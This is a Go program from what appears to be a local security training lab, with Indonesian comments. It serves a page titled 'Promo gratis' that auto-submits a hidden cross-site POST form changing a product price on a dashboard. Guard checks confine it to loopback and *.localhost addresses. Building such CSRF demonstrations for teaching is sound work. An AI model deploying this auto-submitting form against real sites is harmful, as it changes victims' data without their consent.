// Program serangan adalah halaman Dimas: satu form HTML lintas situs yang mengirim POST ke dasbor Ani
// (PATCH menu lewat /api/menu/harga) begitu halaman dimuat, tanpa interaksi apa pun. Dijalankan di host
// berbeda (*.localhost berbeda, misalnya penyerang.localhost) dari dasbor (localhost), supaya browser
// sungguh memperlakukannya sebagai permintaan lintas situs (RFC 6761 §6.3 dan aturan "site" RFC 6265bis §5.2).
// Hanya boleh mendengar di loopback atau *.localhost (internal/pagar), sama dengan labs/t3-mitm.
package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"

	"lab/t3dasbor/internal/pagar"
)

const halaman = `<!doctype html>
<html lang="id"><head><meta charset="utf-8"><title>Promo gratis</title></head>
<body>
<p>Memuat promo…</p>
<form id="f" action="%s/api/menu/harga" method="POST">
<input type="hidden" name="produk_id" value="1">
<input type="hidden" name="harga" value="1">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>`

func main() {
	alamat := flag.String("addr", "", "alamat server, wajib diisi (loopback atau *.localhost saja; run.py mengisi port_lab)")
	sasaran := flag.String("sasaran", "", "origin dasbor yang diserang, wajib diisi (skema://host:port)")
	flag.Parse()
	if *alamat == "" || *sasaran == "" {
		log.Fatal("GAGAL: -addr dan -sasaran wajib diisi")
	}
	if err := pagar.Loopback(*alamat); err != nil {
		log.Fatalf("GAGAL: %v", err)
	}
	if err := pagar.LoopbackURL(*sasaran); err != nil {
		log.Fatalf("GAGAL: -sasaran %v", err)
	}
	mux := http.NewServeMux()
	mux.HandleFunc("GET /", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, halaman, *sasaran)
	})
	log.Printf("serangan mendengar di %s, form menuju %s", *alamat, *sasaran)
	log.Fatal(http.ListenAndServe(*alamat, mux))
}
